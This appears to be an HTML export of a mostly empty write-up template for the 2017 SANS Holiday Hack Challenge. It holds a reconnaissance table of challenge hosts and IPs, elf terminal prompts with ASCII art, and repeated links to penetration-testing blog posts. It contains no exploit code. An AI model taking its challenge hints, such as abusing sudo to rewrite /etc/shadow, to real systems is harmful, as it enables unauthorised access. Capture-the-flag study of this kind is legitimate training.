<td class="org-left">chat.holidayhackchallenge.com</td>
<td class="org-left">FQDN</td>
<td class="org-left">Cert Transparency</td>
</tr>

<tr>
<td class="org-left">35.185.43.23</td>
<td class="org-left">IP</td>
<td class="org-left">DNS (files)</td>
</tr>

<tr>
<td class="org-left">35.185.57.190</td>
<td class="org-left">IP</td>
<td class="org-left">DNS (emi)</td>
</tr>

<tr>
<td class="org-left">35.185.84.51</td>
<td class="org-left">IP</td>
<td class="org-left">DNS (dev)</td>
</tr>

<tr>
<td class="org-left">35.185.115.185</td>
<td class="org-left">IP</td>
<td class="org-left">DNS (admin, mail, ewa)</td>
</tr>

<tr>
<td class="org-left">35.190.163.207</td>
<td class="org-left">IP</td>
<td class="org-left">DNS (docker2017)</td>
</tr>

<tr>
<td class="org-left">35.196.67.150</td>
<td class="org-left">IP</td>
<td class="org-left">DNS (2017)</td>
</tr>

<tr>
<td class="org-left">35.196.73.18</td>
<td class="org-left">IP</td>
<td class="org-left">DNS (chat)</td>
</tr>

<tr>
<td class="org-left">35.196.239.128</td>
<td class="org-left">IP</td>
<td class="org-left">DNS (intranet)</td>
</tr>

<tr>
<td class="org-left">HK-47 (Star Wars Droid)</td>
<td class="org-left">Reference</td>
<td class="org-left">nppd robots.txt</td>
</tr>

<tr>
<td class="org-left">Artoo (Star Wars Droid)</td>
<td class="org-left">Reference</td>
<td class="org-left">nppd robots.txt</td>
</tr>

<tr>
<td class="org-left">Threepio (Star Wars Droid)</td>
<td class="org-left">Reference</td>
<td class="org-left">nppd robots.txt</td>
</tr>

<tr>
<td class="org-left">Sand-Crawler (Star Wars Vehicle)</td>
<td class="org-left">Reference</td>
<td class="org-left">nppd robots.txt</td>
</tr>

<tr>
<td class="org-left">North Pole Police Department</td>
<td class="org-left">Reference</td>
<td class="org-left">nppd /infractions</td>
</tr>

<tr>
<td class="org-left">Cindy Lou Who (2015 Hack)</td>
<td class="org-left">Reference</td>
<td class="org-left">nppd /infractions</td>
</tr>

<tr>
<td class="org-left">Dr. Who (2016 Hack)</td>
<td class="org-left">Reference</td>
<td class="org-left">nppd /infractions</td>
</tr>
</tbody>
</table>
</div>
</div>
</div>

<div id="outline-container-org1bf9e8a" class="outline-2">
<h2 id="org1bf9e8a">Terminals</h2>
<div class="outline-text-2" id="text-org1bf9e8a">
</div>
<div id="outline-container-org1688e9e" class="outline-3">
<h3 id="org1688e9e">Bumble's Bounce</h3>
<div class="outline-text-3" id="text-org1688e9e">
</div>
<div id="outline-container-org066fafb" class="outline-4">
<h4 id="answer-template"><a id="org066fafb"></a>Answer Template</h4>
<div class="outline-text-4" id="text-answer-template">
</div>

<ul class="org-ul">
<li><a id="question"></a><a id="orgaca9400"></a>Question<br />
<div class="outline-text-5" id="text-question">
<pre class="example">
                           ._    _.
                           (_)  (_)                  &lt;&gt; \  / &lt;&gt;
                            .\::/.                   \_\/  \/_/ 
           .:.          _.=._\\//_.=._                  \\//
      ..   \o/   ..      '=' //\\ '='             _&lt;&gt;_\_\&lt;&gt;/_/_&lt;&gt;_
      :o|   |   |o:         '/::\'                 &lt;&gt; / /&lt;&gt;\ \ &lt;&gt;
       ~ '. ' .' ~         (_)  (_)      _    _       _ //\\ _
           &gt;O&lt;             '      '     /_/  \_\     / /\  /\ \
       _ .' . '. _                        \\//       &lt;&gt; /  \ &lt;&gt;
      :o|   |   |o:                   /\_\\&gt;&lt;//_/\
      ''   /o\   ''     '.|  |.'      \/ //&gt;&lt;\\ \/
           ':'        . ~~\  /~~ .       _//\\_
jgs                   _\_._\/_._/_      \_\  /_/ 
                       / ' /\ ' \                   \o/
       o              ' __/  \__ '              _o/.:|:.\o_
  o    :    o         ' .'|  |'.                  .\:|:/.
    '.\'/.'                 .                 -=&gt;&gt;::&gt;o&lt;::&lt;&lt;=-
    :-&gt;@&lt;-:                 :                   _ '/:|:\' _
    .'/.\'.           '.___/*\___.'              o\':|:'/o 
  o    :    o           \* \ / */                   /o\
       o                 &gt;--X--&lt;
                        /*_/ \_*\
                      .'   \*/   '.
                            :
                            '
Minty Candycane here, I need your help straight away.
We're having an argument about browser popularity stray.
Use the supplied log file from our server in the North Pole.
Identifying the least-popular browser is your noteworthy goal.
</pre>
</div>
</li>

<li><a id="how-to-find-the-terminal"></a><a id="org100d15b"></a>How to find the terminal<br />
<div class="outline-text-5" id="text-how-to-find-the-terminal">
<p>
Where was the terminal? What's the direct link to it?
</p>
</div>
</li>

<li><a id="background-information"></a><a id="orgb38ecec"></a>Background Information<br />
<div class="outline-text-5" id="text-background-information">
<p>
Do we know anything about this terminal already?
</p>

<p>
Hints:
</p>

<p>
List any useful hints here.
</p>

<p>
Blog Posts:
</p>

<p>
Are any of these useful?
</p>

<ul class="org-ul">
<li>Putting My Zero Cents In: Using the Free Tier on Amazon Web Services
(EC2)
<a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
Spinning up an EC2 instance, but also a lot of emphasis on how to use
SSH keys.</li>
<li>Your Pokemon Guide for Essential SQL Pen Test Commands
<a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)</li>
<li>Exploiting XXE Vulnerabilities in IIS/.NET
<a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
Including remote content in XML</li>
<li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
<a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a></li>
<li>Go To The Head Of The Class: LD\_PRELOAD For The Win
<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a></li>
<li>A Spot of Tee
<a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
bash shell, and bypassing the I/O restriction with tee</li>
<li>Understanding and Exploiting Web-based LDAP
<a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
LDAP syntax, LDAP injection</li>
<li>Massively Scaling your Scanning
<a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
masscan</li>
</ul>
</div>
</li>

<li><a id="goal"></a><a id="orga4ebf42"></a>Goal<br />
<div class="outline-text-5" id="text-goal">
<p>
What are we trying to accomplish?
</p>
</div>
</li>

<li><a id="approach"></a><a id="orgde1a6f5"></a>Approach<br />
<div class="outline-text-5" id="text-approach">
<p>
Describe the thought process that we tried here. How were we able to use
the hints or the blog posts?
</p>
</div>
</li>

<li><a id="solution"></a><a id="orgb705ca7"></a>Solution<br />
<div class="outline-text-5" id="text-solution">
<p>
Summarize the reference solution that we found.
</p>

<p>
AsciiCinema video of the solution?
</p>
</div>
</li>

<li><a id="alternatives"></a><a id="org7ebec60"></a>Alternatives<br />
<div class="outline-text-5" id="text-alternatives">
<p>
Any other, easier solutions?
</p>
</div>
</li>

<li><a id="common-pitfalls"></a><a id="org7406956"></a>Common Pitfalls<br />
<div class="outline-text-5" id="text-common-pitfalls">
<p>
Do we know what issue(s) people were running into?
</p>
</div>
</li>

<li><a id="about-the-challenge"></a><a id="org885cc7d"></a>About the Challenge<br />
<div class="outline-text-5" id="text-about-the-challenge">
<p>
How was the challenge setup? Was there a better way to secure this
system?
</p>
</div>
</li>

<li><a id="loot"></a><a id="orgfe42eb9"></a>Loot<br />
<div class="outline-text-5" id="text-loot">
<p>
Anything interesting hidden on the system?
</p>
</div>
</li>
</ul>
</div>
</div>
<div id="outline-container-org8dd3295" class="outline-3">
<h3 id="org8dd3295">Cryokinetic Magic</h3>
<div class="outline-text-3" id="text-org8dd3295">
</div>
<div id="outline-container-org03cd311" class="outline-4">
<h4 id="answer-template"><a id="org03cd311"></a>Answer Template</h4>
<div class="outline-text-4" id="text-answer-template">
</div>

<ul class="org-ul">
<li><a id="question"></a><a id="orge3e4ff4"></a>Question<br />
<div class="outline-text-5" id="text-question">
<pre class="example">
                     ___
                    / __'.     .-"""-.
              .-""-| |  '.'.  / .---. \
             / .--. \ \___\ \/ /____| |
            / /    \ `-.-;-(`_)_____.-'._
           ; ;      `.-" "-:_,(o:==..`-. '.         .-"-,
           | |      /       \ /      `\ `. \       / .-. \
           \ \     |         Y    __...\  \ \     / /   \/
     /\     | |    | .--""--.| .-'      \  '.`---' /
     \ \   / /     |`        \'   _...--.;   '---'`
      \ '-' / jgs  /_..---.._ \ .'\\_     `.
       `--'`      .'    (_)  `'/   (_)     /
                  `._       _.'|         .'
                     ```````    '-...--'`

My name is Holly Evergreen, and I have a conundrum.
I broke the candy cane striper, and I'm near throwing a tantrum.
Assembly lines have stopped since the elves can't get their candy cane fix.
We hope you can start the striper once again, with your vast bag of tricks.


Run the CandyCaneStriper executable to complete this challenge.
</pre>
</div>
</li>

<li><a id="how-to-find-the-terminal"></a><a id="orgc65f04c"></a>How to find the terminal<br />
<div class="outline-text-5" id="text-how-to-find-the-terminal">
<p>
Where was the terminal? What's the direct link to it?
</p>
</div>
</li>

<li><a id="background-information"></a><a id="orgf6ddac5"></a>Background Information<br />
<div class="outline-text-5" id="text-background-information">
<p>
Do we know anything about this terminal already?
</p>

<p>
Hints:
</p>

<p>
List any useful hints here.
</p>

<p>
Blog Posts:
</p>

<p>
Are any of these useful?
</p>

<ul class="org-ul">
<li>Putting My Zero Cents In: Using the Free Tier on Amazon Web Services
(EC2)
<a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
Spinning up an EC2 instance, but also a lot of emphasis on how to use
SSH keys.</li>
<li>Your Pokemon Guide for Essential SQL Pen Test Commands
<a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)</li>
<li>Exploiting XXE Vulnerabilities in IIS/.NET
<a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
Including remote content in XML</li>
<li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
<a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a></li>
<li>Go To The Head Of The Class: LD\_PRELOAD For The Win
<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a></li>
<li>A Spot of Tee
<a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
bash shell, and bypassing the I/O restriction with tee</li>
<li>Understanding and Exploiting Web-based LDAP
<a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
LDAP syntax, LDAP injection</li>
<li>Massively Scaling your Scanning
<a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
masscan</li>
</ul>
</div>
</li>

<li><a id="goal"></a><a id="orgb0e3f44"></a>Goal<br />
<div class="outline-text-5" id="text-goal">
<p>
What are we trying to accomplish?
</p>
</div>
</li>

<li><a id="approach"></a><a id="orga662e3d"></a>Approach<br />
<div class="outline-text-5" id="text-approach">
<p>
Describe the thought process that we tried here. How were we able to use
the hints or the blog posts?
</p>
</div>
</li>

<li><a id="solution"></a><a id="org11cc567"></a>Solution<br />
<div class="outline-text-5" id="text-solution">
<p>
Summarize the reference solution that we found.
</p>

<p>
AsciiCinema video of the solution?
</p>
</div>
</li>

<li><a id="alternatives"></a><a id="org8654446"></a>Alternatives<br />
<div class="outline-text-5" id="text-alternatives">
<p>
Any other, easier solutions?
</p>
</div>
</li>

<li><a id="common-pitfalls"></a><a id="org959513f"></a>Common Pitfalls<br />
<div class="outline-text-5" id="text-common-pitfalls">
<p>
Do we know what issue(s) people were running into?
</p>
</div>
</li>

<li><a id="about-the-challenge"></a><a id="org1297c33"></a>About the Challenge<br />
<div class="outline-text-5" id="text-about-the-challenge">
<p>
How was the challenge setup? Was there a better way to secure this
system?
</p>
</div>
</li>

<li><a id="loot"></a><a id="orgc2c66ad"></a>Loot<br />
<div class="outline-text-5" id="text-loot">
<p>
Anything interesting hidden on the system?
</p>
</div>
</li>
</ul>
</div>
</div>
<div id="outline-container-org8fcc336" class="outline-3">
<h3 id="org8fcc336">I Don't Think We're In Kansas Anymore</h3>
<div class="outline-text-3" id="text-org8fcc336">
</div>
<div id="outline-container-orgf26f1fb" class="outline-4">
<h4 id="answer-template"><a id="orgf26f1fb"></a>Answer Template</h4>
<div class="outline-text-4" id="text-answer-template">
</div>

<ul class="org-ul">
<li><a id="question"></a><a id="org4bc1b7c"></a>Question<br />
<div class="outline-text-5" id="text-question">
<pre class="example">
                       *
                      .~'
                     O'~..
                    ~'O'~..
                   ~'O'~..~'
                  O'~..~'O'~.
                 .~'O'~..~'O'~
                ..~'O'~..~'O'~.
               .~'O'~..~'O'~..~'
              O'~..~'O'~..~'O'~..
             ~'O'~..~'O'~..~'O'~..
            ~'O'~..~'O'~..~'O'~..~'
           O'~..~'O'~..~'O'~..~'O'~.
          .~'O'~..~'O'~..~'O'~..~'O'~
         ..~'O'~..~'O'~..~'O'~..~'O'~.
        .~'O'~..~'O'~..~'O'~..~'O'~..~'
       O'~..~'O'~..~'O'~..~'O'~..~'O'~..
      ~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..
     ~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'
    O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~.
   .~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~
  ..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~.
 .~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'
O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..~'O'~..

Sugarplum Mary is in a tizzy, we hope you can assist.
Christmas songs abound, with many likes in our midst.
The database is populated, ready for you to address.
Identify the song whose popularity is the best.
</pre>
</div>
</li>

<li><a id="how-to-find-the-terminal"></a><a id="org3f5fba4"></a>How to find the terminal<br />
<div class="outline-text-5" id="text-how-to-find-the-terminal">
<p>
Where was the terminal? What's the direct link to it?
</p>
</div>
</li>

<li><a id="background-information"></a><a id="org1aaa97c"></a>Background Information<br />
<div class="outline-text-5" id="text-background-information">
<p>
Do we know anything about this terminal already?
</p>

<p>
Hints:
</p>

<p>
List any useful hints here.
</p>

<p>
Blog Posts:
</p>

<p>
Are any of these useful?
</p>

<ul class="org-ul">
<li>Putting My Zero Cents In: Using the Free Tier on Amazon Web Services
(EC2)
<a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
Spinning up an EC2 instance, but also a lot of emphasis on how to use
SSH keys.</li>
<li>Your Pokemon Guide for Essential SQL Pen Test Commands
<a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)</li>
<li>Exploiting XXE Vulnerabilities in IIS/.NET
<a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
Including remote content in XML</li>
<li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
<a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a></li>
<li>Go To The Head Of The Class: LD\_PRELOAD For The Win
<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a></li>
<li>A Spot of Tee
<a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
bash shell, and bypassing the I/O restriction with tee</li>
<li>Understanding and Exploiting Web-based LDAP
<a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
LDAP syntax, LDAP injection</li>
<li>Massively Scaling your Scanning
<a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
masscan</li>
</ul>
</div>
</li>

<li><a id="goal"></a><a id="org2f92fc4"></a>Goal<br />
<div class="outline-text-5" id="text-goal">
<p>
What are we trying to accomplish?
</p>
</div>
</li>

<li><a id="approach"></a><a id="org24da2e4"></a>Approach<br />
<div class="outline-text-5" id="text-approach">
<p>
Describe the thought process that we tried here. How were we able to use
the hints or the blog posts?
</p>
</div>
</li>

<li><a id="solution"></a><a id="orga846eb7"></a>Solution<br />
<div class="outline-text-5" id="text-solution">
<p>
Summarize the reference solution that we found.
</p>

<p>
AsciiCinema video of the solution?
</p>
</div>
</li>

<li><a id="alternatives"></a><a id="orgdffe92b"></a>Alternatives<br />
<div class="outline-text-5" id="text-alternatives">
<p>
Any other, easier solutions?
</p>
</div>
</li>

<li><a id="common-pitfalls"></a><a id="org0cac1ba"></a>Common Pitfalls<br />
<div class="outline-text-5" id="text-common-pitfalls">
<p>
Do we know what issue(s) people were running into?
</p>
</div>
</li>

<li><a id="about-the-challenge"></a><a id="org5872142"></a>About the Challenge<br />
<div class="outline-text-5" id="text-about-the-challenge">
<p>
How was the challenge setup? Was there a better way to secure this
system?
</p>
</div>
</li>

<li><a id="loot"></a><a id="org910b03a"></a>Loot<br />
<div class="outline-text-5" id="text-loot">
<p>
Anything interesting hidden on the system?
</p>
</div>
</li>
</ul>
</div>
</div>
<div id="outline-container-org16b135d" class="outline-3">
<h3 id="org16b135d">Oh Wait Maybe We Are</h3>
<div class="outline-text-3" id="text-org16b135d">
</div>
<div id="outline-container-org2651ba1" class="outline-4">
<h4 id="answer-template"><a id="org2651ba1"></a>Answer Template</h4>
<div class="outline-text-4" id="text-answer-template">
</div>

<ul class="org-ul">
<li><a id="question"></a><a id="org5b6cb79"></a>Question<br />
<div class="outline-text-5" id="text-question">
<pre class="example">
            --&gt;*&lt;--
              /o\
             /_\_\
            /_/_0_\
           /_o_\_\_\
          /_/_/_/_/o\
         /@\_\_\@\_\_\
        /_/_/O/_/_/_/_\
       /_\_\_\_\_\o\_\_\
      /_/0/_/_/_0_/_/@/_\
     /_\_\_\_\_\_\_\_\_\_\
    /_/o/_/_/@/_/_/o/_/0/_\
   jgs       [___]  


My name is Shinny Upatree, and I've made a big mistake.
I fear it's worse than the time I served everyone bad hake.
I've deleted an important file, which suppressed my server access.
I can offer you a gift, if you can fix my ill-fated redress.

Restore /etc/shadow with the contents of /etc/shadow.bak, then run "inspect_da_box" to complete this challenge.
Hint: What commands can you run with sudo?
</pre>
</div>
</li>

<li><a id="how-to-find-the-terminal"></a><a id="orga6203d5"></a>How to find the terminal<br />
<div class="outline-text-5" id="text-how-to-find-the-terminal">
<p>
Where was the terminal? What's the direct link to it?
</p>
</div>
</li>

<li><a id="background-information"></a><a id="org6653f36"></a>Background Information<br />
<div class="outline-text-5" id="text-background-information">
<p>
Do we know anything about this terminal already?
</p>

<p>
Hints:
</p>

<p>
List any useful hints here.
</p>

<p>
Blog Posts:
</p>

<p>
Are any of these useful?
</p>

<ul class="org-ul">
<li>Putting My Zero Cents In: Using the Free Tier on Amazon Web Services
(EC2)
<a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
Spinning up an EC2 instance, but also a lot of emphasis on how to use
SSH keys.</li>
<li>Your Pokemon Guide for Essential SQL Pen Test Commands
<a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)</li>
<li>Exploiting XXE Vulnerabilities in IIS/.NET
<a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
Including remote content in XML</li>
<li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
<a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a></li>
<li>Go To The Head Of The Class: LD\_PRELOAD For The Win
<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a></li>
<li>A Spot of Tee
<a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
bash shell, and bypassing the I/O restriction with tee</li>
<li>Understanding and Exploiting Web-based LDAP
<a href="https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap">https://pen-testing.sans.org/blog/2017/11/27/understanding-and-exploiting-web-based-ldap</a>
LDAP syntax, LDAP injection</li>
<li>Massively Scaling your Scanning
<a href="https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning">https://pen-testing.sans.org/blog/2017/10/25/massively-scaling-your-scanning</a>
masscan</li>
</ul>
</div>
</li>

<li><a id="goal"></a><a id="orgc318f26"></a>Goal<br />
<div class="outline-text-5" id="text-goal">
<p>
What are we trying to accomplish?
</p>
</div>
</li>

<li><a id="approach"></a><a id="org6a8426e"></a>Approach<br />
<div class="outline-text-5" id="text-approach">
<p>
Describe the thought process that we tried here. How were we able to use
the hints or the blog posts?
</p>
</div>
</li>

<li><a id="solution"></a><a id="orgf766d4c"></a>Solution<br />
<div class="outline-text-5" id="text-solution">
<p>
Summarize the reference solution that we found.
</p>

<p>
AsciiCinema video of the solution?
</p>
</div>
</li>

<li><a id="alternatives"></a><a id="org5a197a4"></a>Alternatives<br />
<div class="outline-text-5" id="text-alternatives">
<p>
Any other, easier solutions?
</p>
</div>
</li>

<li><a id="common-pitfalls"></a><a id="org6bbba41"></a>Common Pitfalls<br />
<div class="outline-text-5" id="text-common-pitfalls">
<p>
Do we know what issue(s) people were running into?
</p>
</div>
</li>

<li><a id="about-the-challenge"></a><a id="org7fce289"></a>About the Challenge<br />
<div class="outline-text-5" id="text-about-the-challenge">
<p>
How was the challenge setup? Was there a better way to secure this
system?
</p>
</div>
</li>

<li><a id="loot"></a><a id="orgfd4273f"></a>Loot<br />
<div class="outline-text-5" id="text-loot">
<p>
Anything interesting hidden on the system?
</p>
</div>
</li>
</ul>
</div>
</div>
<div id="outline-container-orgf22753e" class="outline-3">
<h3 id="orgf22753e">There's No Place Like Home</h3>
<div class="outline-text-3" id="text-orgf22753e">
</div>
<div id="outline-container-org67fcc20" class="outline-4">
<h4 id="answer-template"><a id="org67fcc20"></a>Answer Template</h4>
<div class="outline-text-4" id="text-answer-template">
</div>

<ul class="org-ul">
<li><a id="question"></a><a id="org427ed23"></a>Question<br />
<div class="outline-text-5" id="text-question">
<pre class="example">

                             ______
                          .-"""".._'.       _,##
                   _..__ |.-"""-.|  |   _,##'`-._
                  (_____)||_____||  |_,##'`-._,##'`
                  _|   |.;-""-.  |  |#'`-._,##'`
               _.;_ `--' `\    \ |.'`\._,##'`
              /.-.\ `\     |.-";.`_, |##'`
              |\__/   | _..;__  |'-' /
              '.____.'_.-`)\--' /'-'`
               //||\\(_.-'_,'-'`
             (`-...-')_,##'`
      jgs _,##`-..,-;##`
       _,##'`-._,##'`
    _,##'`-._,##'`
      `-._,##'`
My name is Pepper Minstix, and I need your help with my plight.
I've crashed the Christmas toy train, for which I am quite contrite.
I should not have interfered, hacking it was foolish in hindsight.
If you can get it running again, I will reward you with a gift of delight.
</pre>
</div>
</li>

<li><a id="how-to-find-the-terminal"></a><a id="org10e2ba1"></a>How to find the terminal<br />
<div class="outline-text-5" id="text-how-to-find-the-terminal">
<p>
Where was the terminal? What's the direct link to it?
</p>
</div>
</li>

<li><a id="background-information"></a><a id="orga27a211"></a>Background Information<br />
<div class="outline-text-5" id="text-background-information">
<p>
Do we know anything about this terminal already?
</p>

<p>
Hints:
</p>

<p>
List any useful hints here.
</p>

<p>
Blog Posts:
</p>

<p>
Are any of these useful?
</p>

<ul class="org-ul">
<li>Putting My Zero Cents In: Using the Free Tier on Amazon Web Services
(EC2)
<a href="https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2">https://pen-testing.sans.org/blog/2017/12/10/putting-my-zero-cents-in-using-the-free-tier-on-amazon-web-services-ec2</a>
Spinning up an EC2 instance, but also a lot of emphasis on how to use
SSH keys.</li>
<li>Your Pokemon Guide for Essential SQL Pen Test Commands
<a href="https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands">https://pen-testing.sans.org/blog/2017/12/09/your-pokemon-guide-for-essential-sql-pen-test-commands</a>
SQL basics (SELECT, WHERE, wildcards, ORDER BY, GROUP BY, COUNT)</li>
<li>Exploiting XXE Vulnerabilities in IIS/.NET
<a href="https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities">https://pen-testing.sans.org/blog/2017/12/08/entity-inception-exploiting-iis-net-with-xxe-vulnerabilities</a>
Including remote content in XML</li>
<li>Why You Need the Skills to Tinker with Publicly Released Exploit Code
<a href="https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code">https://pen-testing.sans.org/blog/2017/12/05/why-you-need-the-skills-to-tinker-with-publicly-released-exploit-code</a>
Mentions Apache struts vulnerabilities, specifically CVE-2017-5638 and
CVE-2017-9805 Code: <a href="https://github.com/chrisjd20/cve-2017-9805.py">https://github.com/chrisjd20/cve-2017-9805.py</a></li>
<li>Go To The Head Of The Class: LD\_PRELOAD For The Win
<a href="https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win">https://pen-testing.sans.org/blog/2017/12/06/go-to-the-head-of-the-class-ld-preload-for-the-win</a></li>
<li>A Spot of Tee
<a href="https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee">https://pen-testing.sans.org/blog/2017/12/06/a-spot-of-tee</a> Restricted
bash shell, and bypassing the I/O restriction with tee</li>
<li>Understanding and Exploiting Web-based LDAP
